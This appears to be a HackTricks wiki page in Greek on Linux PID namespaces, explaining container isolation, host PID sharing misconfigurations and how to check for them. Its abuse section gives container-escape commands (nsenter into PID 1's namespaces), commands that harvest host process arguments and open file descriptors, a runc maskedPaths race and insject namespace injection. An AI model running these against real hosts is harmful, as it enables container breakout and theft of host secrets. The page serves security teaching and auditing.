# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Το PID namespace ελέγχει τον τρόπο αρίθμησης των processes και ποια processes είναι ορατά. Γι' αυτό ένα container μπορεί να έχει το δικό του PID 1, παρόλο που δεν είναι πραγματικό machine. Μέσα στο namespace, το workload βλέπει αυτό που φαίνεται σαν ένα τοπικό process tree. Έξω από το namespace, το host εξακολουθεί να βλέπει τα πραγματικά PIDs του host και ολόκληρο το process landscape.

Από άποψη security, το PID namespace έχει σημασία επειδή η ορατότητα των processes είναι πολύτιμη. Μόλις ένα workload μπορεί να δει processes του host, ενδέχεται να μπορεί να παρατηρήσει ονόματα services, ορίσματα γραμμής εντολών, secrets που έχουν περαστεί ως process arguments, state που προέρχεται από το environment μέσω του `/proc` και πιθανούς στόχους για namespace entry. Αν μπορεί να κάνει περισσότερα από το να βλέπει απλώς αυτά τα processes, για παράδειγμα να στέλνει signals ή να χρησιμοποιεί ptrace υπό τις κατάλληλες προϋποθέσεις, το πρόβλημα γίνεται πολύ σοβαρότερο.

## Λειτουργία

Ένα νέο PID namespace ξεκινά με τη δική του εσωτερική αρίθμηση processes. Το πρώτο process που δημιουργείται μέσα σε αυτό γίνεται PID 1 από την οπτική γωνία του namespace, κάτι που σημαίνει επίσης ότι αποκτά ειδική init-like συμπεριφορά για orphaned children και signal behavior. Αυτό εξηγεί πολλές ιδιαιτερότητες των containers σχετικά με τα init processes, το zombie reaping και τον λόγο για τον οποίο μερικές φορές χρησιμοποιούνται tiny init wrappers σε containers.

Το σημαντικό security lesson είναι ότι ένα process μπορεί να φαίνεται isolated επειδή βλέπει μόνο το δικό του PID tree, αλλά αυτή η isolation μπορεί να αφαιρεθεί σκόπιμα. Το Docker το εκθέτει μέσω του `--pid=host`, ενώ το Kubernetes το κάνει μέσω του `hostPID: true`. Μόλις το container ενταχθεί στο host PID namespace, το workload βλέπει απευθείας τα processes του host και πολλά μεταγενέστερα attack paths γίνονται πολύ πιο ρεαλιστικά.

## Lab

Για να δημιουργήσετε χειροκίνητα ένα PID namespace:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Το shell πλέον βλέπει μια ιδιωτική προβολή διεργασιών. Το flag `--mount-proc` είναι σημαντικό, επειδή προσαρτά ένα instance του procfs που αντιστοιχεί στο νέο PID namespace, κάνοντας τη λίστα διεργασιών συνεκτική από το εσωτερικό του.

Για να συγκρίνουμε τη συμπεριφορά των containers:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Η διαφορά είναι άμεση και εύκολα κατανοητή, γι’ αυτό αποτελεί ένα καλό πρώτο lab για τους αναγνώστες.

## Χρήση κατά το Runtime

Τα κανονικά containers στα Docker, Podman, containerd και CRI-O αποκτούν το δικό τους PID namespace. Τα Kubernetes Pods συνήθως λαμβάνουν επίσης μια απομονωμένη προβολή PID, εκτός αν το workload ζητήσει ρητά την κοινή χρήση του host PID. Τα περιβάλλοντα LXC/Incus βασίζονται στο ίδιο kernel primitive, αν και οι περιπτώσεις χρήσης system-container μπορεί να εκθέτουν πιο περίπλοκα process trees και να ενθαρρύνουν περισσότερα debugging shortcuts.

Ο ίδιος κανόνας ισχύει παντού: αν το runtime επέλεξε να μην απομονώσει το PID namespace, αυτό αποτελεί σκόπιμη μείωση του ορίου ασφαλείας του container.

## Λανθασμένες ρυθμίσεις

Η canonical λανθασμένη ρύθμιση είναι η κοινή χρήση του host PID. Οι ομάδες συχνά την αιτιολογούν για λόγους debugging, monitoring ή ευκολίας στη διαχείριση services, αλλά θα πρέπει πάντα να αντιμετωπίζεται ως ουσιαστική εξαίρεση ασφαλείας. Ακόμη και αν το container δεν διαθέτει άμεσο write primitive πάνω σε host processes, η ορατότητα από μόνη της μπορεί να αποκαλύψει πολλά για το σύστημα. Μόλις προστεθούν capabilities όπως `CAP_SYS_PTRACE` ή χρήσιμη πρόσβαση στο procfs, ο κίνδυνος αυξάνεται σημαντικά.

Ένα ακόμη λάθος είναι η υπόθεση ότι, επειδή το workload δεν μπορεί από προεπιλογή να κάνει kill ή ptrace σε host processes, η κοινή χρήση του host PID είναι επομένως ακίνδυνη. Αυτό το συμπέρασμα αγνοεί την αξία του enumeration, τη διαθεσιμότητα targets για namespace-entry και τον τρόπο με τον οποίο η ορατότητα των PID συνδυάζεται με άλλους εξασθενημένους ελέγχους.

## Κατάχρηση

Αν το host PID namespace είναι κοινόχρηστο, ένας attacker μπορεί να επιθεωρήσει host processes, να συλλέξει process arguments, να εντοπίσει ενδιαφέροντα services, να βρει υποψήφια PIDs για `nsenter` ή να συνδυάσει την ορατότητα των processes με privilege που σχετίζεται με ptrace, ώστε να παρέμβει σε host ή neighboring workloads. Σε ορισμένες περιπτώσεις, ακόμη και η απλή παρατήρηση του σωστού long-running process αρκεί για να αλλάξει το υπόλοιπο attack plan.

Το πρώτο πρακτικό βήμα είναι πάντα να επιβεβαιωθεί ότι τα host processes είναι πράγματι ορατά:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Μόλις τα host PIDs γίνουν ορατά, τα ορίσματα των διεργασιών και οι στόχοι namespace-entry συχνά αποτελούν την πιο χρήσιμη πηγή πληροφοριών:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Εάν το `nsenter` είναι διαθέσιμο και υπάρχουν επαρκή προνόμια, ελέγξτε αν μια ορατή διεργασία του host μπορεί να χρησιμοποιηθεί ως γέφυρα namespace:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Ακόμα και όταν η είσοδος είναι αποκλεισμένη, το host PID sharing είναι ήδη πολύτιμο, επειδή αποκαλύπτει τη διάταξη των υπηρεσιών, τα runtime components και υποψήφιες privileged processes για επόμενο στόχο.

Η ορατότητα των host PID καθιστά επίσης πιο ρεαλιστική την κατάχρηση file descriptors. Αν μια privileged host process ή ένα neighboring workload έχει ανοιχτό ένα ευαίσθητο file ή socket, ο attacker μπορεί να είναι σε θέση να επιθεωρήσει το `/proc/<pid>/fd/` και να επαναχρησιμοποιήσει το συγκεκριμένο handle, ανάλογα με το ownership, τις επιλογές mount του procfs και το μοντέλο της υπηρεσίας-στόχου.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Αυτές οι εντολές είναι χρήσιμες επειδή δείχνουν αν το `hidepid=1` ή το `hidepid=2` περιορίζει την cross-process ορατότητα και αν προφανώς ενδιαφέροντα file descriptors, όπως ανοιχτά secret files, logs ή Unix sockets, είναι γενικά ορατά.

### Πλήρες Παράδειγμα: host PID + `nsenter`

Το sharing του host PID γίνεται άμεσο host escape όταν η διεργασία έχει επίσης επαρκή προνόμια για να συνδεθεί στα host namespaces:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Εάν η εντολή ολοκληρωθεί με επιτυχία, η διεργασία του container εκτελείται πλέον στα mount, UTS, network, IPC και PID namespaces του host. Ο αντίκτυπος είναι άμεσος compromise του host.

Ακόμη και όταν το ίδιο το `nsenter` απουσιάζει, το ίδιο αποτέλεσμα μπορεί να επιτευχθεί μέσω του binary του host, εάν το filesystem του host είναι mounted:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Πρόσφατες σημειώσεις Runtime

Ορισμένες επιθέσεις που σχετίζονται με το PID namespace δεν είναι παραδοσιακές εσφαλμένες ρυθμίσεις `hostPID: true`, αλλά σφάλματα υλοποίησης του runtime σχετικά με τον τρόπο εφαρμογής των προστασιών του procfs κατά τη ρύθμιση του container.

#### Race του `maskedPaths` προς το procfs του host

Σε ευάλωτες εκδόσεις του `runc`, attackers που μπορούν να ελέγξουν το container image ή το workload του `runc exec` μπορούν να προκαλέσουν race στη φάση masking, αντικαθιστώντας το `/dev/null` στην πλευρά του container με ένα symlink προς μια ευαίσθητη διαδρομή procfs, όπως το `/proc/sys/kernel/core_pattern`. Αν το race πετύχει, το bind mount του masked path μπορεί να τοποθετηθεί σε λάθος target και να εκθέσει knobs του procfs με καθολική ισχύ στον host στο νέο container.

Χρήσιμη εντολή ελέγχου:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Αυτό είναι σημαντικό, επειδή ο τελικός αντίκτυπος μπορεί να είναι ίδιος με μια άμεση έκθεση του procfs: εγγράψιμο `core_pattern` ή `sysrq-trigger`, ακολουθούμενο από εκτέλεση κώδικα στο host ή denial of service.

#### Namespace injection με `insject`

Τα εργαλεία Namespace injection, όπως το `insject`, δείχνουν ότι η αλληλεπίδραση με ένα PID namespace δεν απαιτεί πάντα την εκ των προτέρων είσοδο στο target namespace πριν από τη δημιουργία της διεργασίας. Ένα helper μπορεί να συνδεθεί αργότερα, να χρησιμοποιήσει `setns()` και να εκτελεστεί διατηρώντας την ορατότητα στον χώρο PID του target:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Αυτό το είδος τεχνικής είναι κυρίως σημαντικό για advanced debugging, offensive tooling και post-exploitation workflows, όπου το namespace context πρέπει να συνδεθεί αφού το runtime έχει ήδη αρχικοποιήσει το workload.

### Σχετικά FD Abuse Patterns

Αξίζει να επισημανθούν ρητά δύο patterns όταν είναι ορατά τα host PIDs. Πρώτον, μια privileged διεργασία μπορεί να διατηρεί ένα sensitive file descriptor ανοιχτό κατά τη διάρκεια του `execve()`, επειδή δεν είχε επισημανθεί με `O_CLOEXEC`. Δεύτερον, οι υπηρεσίες μπορεί να μεταβιβάζουν file descriptors μέσω Unix sockets χρησιμοποιώντας `SCM_RIGHTS`. Και στις δύο περιπτώσεις, το ενδιαφέρον αντικείμενο δεν είναι πλέον το pathname, αλλά το ήδη ανοιχτό handle, το οποίο μια διεργασία με χαμηλότερα privileges μπορεί να κληρονομήσει ή να λάβει.

Αυτό είναι σημαντικό στο container work, επειδή το handle μπορεί να δείχνει στο `docker.sock`, σε ένα privileged log, σε ένα host secret file ή σε άλλο high-value object, ακόμη και όταν το ίδιο το path δεν είναι άμεσα προσβάσιμο από το container filesystem.

## Έλεγχοι

Σκοπός αυτών των commands είναι να καθοριστεί αν η διεργασία διαθέτει private PID view ή αν μπορεί ήδη να απαριθμήσει ένα πολύ ευρύτερο process landscape.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Τι είναι ενδιαφέρον εδώ:

- Αν η λίστα διεργασιών περιέχει προφανείς host services, πιθανότατα το host PID sharing είναι ήδη ενεργό.
- Το να βλέπετε μόνο ένα μικρό container-local tree είναι η κανονική baseline· το να βλέπετε `systemd`, `dockerd` ή άσχετους daemons δεν είναι.
- Μόλις γίνουν ορατά τα host PIDs, ακόμη και οι read-only πληροφορίες διεργασιών γίνονται χρήσιμη reconnaissance.

Αν ανακαλύψετε ένα container που εκτελείται με host PID sharing, μην το αντιμετωπίσετε ως απλή αισθητική διαφορά. Πρόκειται για σημαντική αλλαγή σε όσα μπορεί να παρατηρεί και δυνητικά να επηρεάζει το workload.
{{#include ../../../../../banners/hacktricks-training.md}}
